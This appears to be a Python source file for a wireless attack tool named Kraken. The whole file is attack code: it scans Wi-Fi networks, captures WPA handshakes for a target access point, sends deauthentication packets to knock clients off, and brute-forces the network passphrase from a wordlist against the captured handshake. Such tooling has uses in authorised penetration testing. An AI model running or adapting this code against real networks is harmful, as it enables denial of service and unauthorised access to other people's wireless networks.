import json
from collections.abc import Callable
from pathlib import Path

from kraken.services.crypto import check_password
from kraken.core.deauth import Deauth
from kraken.core.handshake import HandshakeCapture
from kraken.core.scanner import NetworkScanner
from kraken.services.wireless import WirelessManager


class Kraken:
    def __init__(self) -> None:
        self.wireless = WirelessManager()
        self.scanner = NetworkScanner()
        self.deauth = Deauth()

    def dump_networks(
        self,
        iface: str,
        target_bssid: str | None = None,
        channel: int | None = None,
        network_callback: Callable[[dict], None] | None = None,
        handshake_callback: Callable[[HandshakeCapture], None] | None = None,
    ) -> None:
        if target_bssid and channel:
            target_bssid = target_bssid.upper()
            self.wireless.set_channel(iface, channel)
            capture = HandshakeCapture(target_bssid).capture(
                iface, packet_callback=handshake_callback
            )
            Path("handshake.json").write_text(
                json.dumps(capture.to_dict(), indent=2), encoding="utf-8"
            )
            return

        self.scanner.scan(iface, packet_callback=network_callback)

    def send_deauth(self, iface: str, bssid: str, client: str, packets: int) -> None:
        self.deauth.send(iface, bssid, client, packets)

    def crack_handshake(self, wordlist: str, handshake_file: str) -> str | None:
        data = json.loads(Path(handshake_file).read_text(encoding="utf-8"))
        required = ("ssid", "bssid", "client", "anonce", "snonce", "mic", "eapol")

        if not all(data.get(key) for key in required):
            raise ValueError("handshake file is incomplete")

        values = {
            "ssid": data["ssid"].encode(),
            "ap": bytes.fromhex(data["bssid"].replace(":", "")),
            "client": bytes.fromhex(data["client"].replace(":", "")),
            "anonce": bytes.fromhex(data["anonce"]),
            "snonce": bytes.fromhex(data["snonce"]),
            "mic": bytes.fromhex(data["mic"]),
            "eapol": bytes.fromhex(data["eapol"]),
        }

        for line in Path(wordlist).read_text(encoding="utf-8").splitlines():
            password = line.strip()

            if password and check_password(password, **values):
                return password

        return None
